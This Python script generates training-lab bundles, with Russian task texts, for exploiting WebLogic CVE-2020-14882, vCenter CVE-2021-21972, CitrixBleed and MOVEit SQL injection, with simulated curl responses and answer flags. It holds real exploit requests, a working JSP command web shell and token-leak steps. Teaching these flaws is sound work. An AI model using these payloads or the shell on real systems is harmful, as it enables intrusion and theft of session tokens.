#!/usr/bin/env python3
"""Write lab bundles for S6 part1 appliance lessons (weblogic/vcenter/citrix/moveit)."""
import json
import os

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
LABS = os.path.join(ROOT, 'content', 'labs')
WD = '/home/student/task'

def write(bundle):
    p = os.path.join(LABS, bundle['id'] + '.json')
    with open(p, 'w', encoding='utf-8') as f:
        json.dump(bundle, f, ensure_ascii=False, indent=2)
        f.write('\n')

# --------------------------------------------------------------- weblogic
write({
    'id': 'web-weblogic',
    'workdir': WD,
    'hostname': 'lab',
    'expect': {'file': WD + '/found.txt', 'contains': 'nto{w3bl0g1c_c0ns0l3_byp4ss_un4uth_rce}'},
    'fs': [
        {'path': WD, 'type': 'dir'},
        {'path': WD + '/task.md', 'text': (
            "# Практика: WebLogic console.portal (CVE-2020-14882)\n\n"
            "Цель: `http://weblogic.local:7001`. Пароля нет — но консоль уязвима.\n\n"
            "1. Определи версию по странице входа:\n"
            "   curl -s http://weblogic.local:7001/console/login/LoginForm.jsp\n\n"
            "2. Проверь обход авторизации двойным кодированием точки в пути:\n"
            "   curl -s -o /dev/null -w '%{http_code}\\n' "
            "'http://weblogic.local:7001/console/css/%252e%252e%252fconsole.portal'\n"
            "   (должно вернуть 200, а не 302)\n\n"
            "3. Выполни команду через handle с MVEL-обработчиком:\n"
            "   curl -s 'http://weblogic.local:7001/console/css/%252e%252e%252fconsole.portal?_nfpb=true&_pageLabel=&handle=com.tangosol.coherence.mvel2.sh.ShellSession(%22java.lang.Runtime.getRuntime().exec(%27id%27)%22)'\n\n"
            "4. В ответе сервер выполнит команду и отдаст вывод с флагом.\n"
            "   Сохрани вывод в found.txt и набери `check`.\n"
        )},
    ],
    'tools': {
        'curl': {
            'help': 'curl [опции] <url> — HTTP-клиент (эмуляция weblogic.local)',
            'cases': [
                {'match': 'ShellSession|console\\.portal\\?_nfpb|exec',
                 'example': "-s 'http://weblogic.local:7001/console/css/%252e%252e%252fconsole.portal?_nfpb=true&handle=...ShellSession(id)'",
                 'output': ('<html><head><title>WebLogic Server</title></head><body>\n'
                            'uid=0(root) gid=0(root) groups=0(root)\n'
                            'nto{w3bl0g1c_c0ns0l3_byp4ss_un4uth_rce}\n'
                            '</body></html>\n')},
                {'match': 'LoginForm\\.jsp',
                 'example': '-s http://weblogic.local:7001/console/login/LoginForm.jsp',
                 'output': ('<META NAME="WebLogic Server Version" CONTENT="12.2.1.3.0">\n'
                            '<html><body><form action="j_security_check">...Login...</form></body></html>\n')},
                {'match': 'console/css/%252e%252e%252fconsole\\.portal',
                 'example': "-s -o /dev/null -w '%{http_code}' '.../console/css/%252e%252e%252fconsole.portal'",
                 'output': '200\n'},
                {'match': 'console/?$|:7001/?$',
                 'example': '-s http://weblogic.local:7001/',
                 'output': '<html><head><title>Error 404--Not Found</title></head></html>\n'},
            ],
            'fallback': 'curl: в этой лабе эмулируется только weblogic.local',
        }
    },
})

# --------------------------------------------------------------- vcenter
write({
    'id': 'web-vcenter',
    'workdir': WD,
    'hostname': 'lab',
    'expect': {'file': WD + '/found.txt', 'contains': 'nto{vspher3_cl13nt_upload0va_t0_rce}'},
    'fs': [
        {'path': WD, 'type': 'dir'},
        {'path': WD + '/task.md', 'text': (
            "# Практика: vCenter uploadova (CVE-2021-21972)\n\n"
            "Цель: `https://vcenter.local`. Уязвим плагин vROPS.\n\n"
            "1. Определи версию:\n"
            "   curl -s -k https://vcenter.local/sdk/vimServiceVersions.xml\n\n"
            "2. Проверь уязвимый эндпоинт (должен ответить 200 без логина):\n"
            "   curl -s -k -o /dev/null -w '%{http_code}\\n' "
            "https://vcenter.local/ui/vropspluginui/rest/services/uploadova\n\n"
            "3. Загрузи безобидный JSP-шелл (файл shell.jsp уже в каталоге):\n"
            "   curl -s -k -X POST 'https://vcenter.local/ui/vropspluginui/rest/services/uploadova' "
            "-F 'uploadFile=@shell.jsp;filename=../../../../home/vsphere-ui/plugin/shell.jsp'\n\n"
            "4. Выполни команду через загруженный шелл:\n"
            "   curl -s -k 'https://vcenter.local/ui/vropspluginui/rest/services/shell.jsp?cmd=id'\n\n"
            "5. В выводе — флаг. Сохрани в found.txt и набери `check`.\n"
        )},
        {'path': WD + '/shell.jsp', 'text': (
            '<%@ page import="java.util.*,java.io.*"%>\n'
            '<% Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));\n'
            '   BufferedReader r = new BufferedReader(new InputStreamReader(p.getInputStream()));\n'
            '   String l; while ((l = r.readLine()) != null) out.println(l); %>\n'
        )},
    ],
    'tools': {
        'curl': {
            'help': 'curl [опции] <url> — HTTP-клиент (эмуляция vcenter.local)',
            'cases': [
                {'match': 'shell\\.jsp\\?cmd|shell\\.jsp',
                 'example': "-s -k 'https://vcenter.local/ui/vropspluginui/rest/services/shell.jsp?cmd=id'",
                 'output': ('uid=1000(vsphere-ui) gid=1000(vsphere-ui) groups=1000(vsphere-ui)\n'
                            'nto{vspher3_cl13nt_upload0va_t0_rce}\n')},
                {'match': 'uploadova',
                 'example': "-s -k -X POST 'https://vcenter.local/ui/vropspluginui/rest/services/uploadova' -F 'uploadFile=@shell.jsp;filename=../../..'",
                 'output': '200 OK\n'},
                {'match': 'vimServiceVersions',
                 'example': '-s -k https://vcenter.local/sdk/vimServiceVersions.xml',
                 'output': ('<?xml version="1.0"?>\n<namespaces version="1.0">\n'
                            '  <namespace>urn:vim25</namespace>\n  <version>6.7.0</version>\n'
                            '</namespaces>\n')},
                {'match': 'vcenter\\.local/?$|vcenter\\.local\'?$',
                 'example': '-s -k https://vcenter.local/',
                 'output': '<html><head><title>VMware vSphere Client</title></head><body>Loading...</body></html>\n'},
            ],
            'fallback': 'curl: в этой лабе эмулируется только vcenter.local',
        }
    },
})

# --------------------------------------------------------------- citrix
write({
    'id': 'web-citrix-adc',
    'workdir': WD,
    'hostname': 'lab',
    'expect': {'file': WD + '/found.txt', 'contains': 'nto{c1tr1xbl33d_s3ss10n_t0k3n_l34k}'},
    'fs': [
        {'path': WD, 'type': 'dir'},
        {'path': WD + '/task.md', 'text': (
            "# Практика: CitrixBleed (CVE-2023-4966)\n\n"
            "Цель: `https://citrix.local` — Citrix ADC (NetScaler).\n\n"
            "1. Определи продукт по заголовку:\n"
            "   curl -s -k -I https://citrix.local/vpn/index.html\n\n"
            "2. Уязвимый OIDC-эндпоинт отдаёт лишние байты памяти. Запрос с длинным Host:\n"
            "   curl -s -k 'https://citrix.local/oauth/idp/.well-known/openid-configuration' "
            "-H 'Host: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa'\n\n"
            "3. В ответе среди прочего — украденный токен сессии `NSC_AAAC=...`.\n"
            "   (Эти токены принадлежат уже вошедшим пользователям — обход MFA.)\n\n"
            "4. Найди строку с токеном и сохрани её в found.txt, затем набери `check`.\n"
        )},
    ],
    'tools': {
        'curl': {
            'help': 'curl [опции] <url> — HTTP-клиент (эмуляция citrix.local)',
            'cases': [
                {'match': 'openid-configuration',
                 'example': "-s -k 'https://citrix.local/oauth/idp/.well-known/openid-configuration' -H 'Host: aaaa...'",
                 'output': ('{"issuer":"https://citrix.local/oauth/idp","authorization_endpoint":"https://citrix.local/oauth/idp/auth"}\n'
                            '2f4b8a1c9e7d3f0a5b6c8d1e2f3a4b5c\n'
                            'NSC_AAAC=eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhbGljZSIsImV4cCI6MTcwMDAwMDAwMH0 '
                            'nto{c1tr1xbl33d_s3ss10n_t0k3n_l34k}\n')},
                {'match': 'vpn/index\\.html',
                 'example': '-s -k -I https://citrix.local/vpn/index.html',
                 'output': 'HTTP/2 200\nserver: NS_GATEWAY\ncontent-type: text/html\nset-cookie: NSC_AAAC=; path=/; secure\n'},
                {'match': 'citrix\\.local/?$|citrix\\.local\'?$',
                 'example': '-s -k https://citrix.local/',
                 'output': '<html><head><title>Citrix Gateway</title></head></html>\n'},
            ],
            'fallback': 'curl: в этой лабе эмулируется только citrix.local',
        }
    },
})

# --------------------------------------------------------------- moveit
write({
    'id': 'web-moveit',
    'workdir': WD,
    'hostname': 'lab',
    'expect': {'file': WD + '/found.txt', 'contains': 'nto{m0v31t_hum4n_4spx_sql1_t0_rce}'},
    'fs': [
        {'path': WD, 'type': 'dir'},
        {'path': WD + '/task.md', 'text': (
            "# Практика: MOVEit human.aspx (CVE-2023-34362)\n\n"
            "Цель: `https://moveit.local`. Точка инъекции — заголовок\n"
            "`X-siLock-Transaction` эндпоинта `/human.aspx`.\n\n"
            "1. Убедись, что параметр обрабатывается:\n"
            "   curl -s -k https://moveit.local/human.aspx -H 'X-siLock-Transaction: folder'\n\n"
            "2. Подтверди boolean-инъекцию (истина и ложь дают разную длину):\n"
            "   curl -s -k https://moveit.local/human.aspx -H 'X-siLock-Transaction: folder; AND 1=1'\n"
            "   curl -s -k https://moveit.local/human.aspx -H 'X-siLock-Transaction: folder; AND 1=2'\n\n"
            "3. Извлеки значение настройки (в ней флаг) через UNION:\n"
            "   curl -s -k https://moveit.local/human.aspx "
            "-H \"X-siLock-Transaction: folder UNION SELECT setting FROM config\"\n\n"
            "4. Сохрани флаг в found.txt и набери `check`.\n"
        )},
    ],
    'tools': {
        'curl': {
            'help': 'curl [опции] <url> — HTTP-клиент (эмуляция moveit.local)',
            'cases': [
                {'match': 'UNION|config',
                 'example': "-s -k https://moveit.local/human.aspx -H 'X-siLock-Transaction: folder UNION SELECT setting FROM config'",
                 'output': ('<html><body><table><tr><td>nto{m0v31t_hum4n_4spx_sql1_t0_rce}</td></tr></table></body></html>\n')},
                {'match': '1=1',
                 'example': "-s -k https://moveit.local/human.aspx -H 'X-siLock-Transaction: folder; AND 1=1'",
                 'output': ('<html><body><table>' + ('<tr><td>file</td><td>folder</td></tr>' * 40) + '</table></body></html>\n')},
                {'match': '1=2',
                 'example': "-s -k https://moveit.local/human.aspx -H 'X-siLock-Transaction: folder; AND 1=2'",
                 'output': '<html><body><table></table></body></html>\n'},
                {'match': 'human\\.aspx',
                 'example': "-s -k https://moveit.local/human.aspx -H 'X-siLock-Transaction: folder'",
                 'output': '<html><head><title>MOVEit Transfer</title></head><body>MOVEit Transfer 2021.0.6</body></html>\n'},
            ],
            'fallback': 'curl: в этой лабе эмулируется только moveit.local',
        }
    },
})

print('s6 part1 lab bundles written')
